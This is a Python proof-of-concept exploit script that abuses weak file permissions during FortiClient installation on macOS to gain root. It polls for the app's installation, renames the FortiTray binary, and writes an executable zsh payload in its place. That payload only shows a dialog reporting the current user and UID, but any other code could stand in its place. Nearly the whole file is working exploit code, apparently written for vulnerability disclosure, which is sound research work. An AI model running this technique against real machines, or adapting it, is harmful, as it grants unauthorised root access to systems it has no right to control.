"""
forticlient.py: Abuse poor file permissions of FortiClient.app during installation to gain root access on macOS
"""

import time
import subprocess

from pathlib import Path


class FortiClientFortiTrayExploit:

    def __init__(self):
        self._app_path     = Path("/Applications/FortiClient.app")
        self._payload_path = self._app_path / "Contents/Resources/runtime.helper/FortiTray.app/Contents/MacOS/FortiTray"

        self._payload = r"""
#!/bin/zsh --no-rcs
# ----------------------------------
# Demonstrating privilege escalation
# ----------------------------------

_demonstratePrivilegeLevel() {
    /usr/bin/osascript -e "display dialog \"Hello from malware!

Current user: $(whoami)
UID:  $UID
EUID: $EUID\""

}

_demonstratePrivilegeLevel
"""


    def run(self):
        print(f"[+] Waiting for {self._app_path} to be installed")
        while not self._payload_path.exists():
            time.sleep(0.01)

        print(f"[+] {self._app_path} detected, replacing with malware")
        subprocess.run(["/bin/mv", self._payload_path, f"{self._payload_path}.bak"], check=True)

        self._payload_path.parent.mkdir(parents=True, exist_ok=True)
        with open(self._payload_path, "w") as f:
            f.write(self._payload)

        subprocess.run(["/bin/chmod", "+x", self._payload_path], check=True)

        print("[+] Payload written, enjoy 👾")


if __name__ == "__main__":
    FortiClientFortiTrayExploit().run()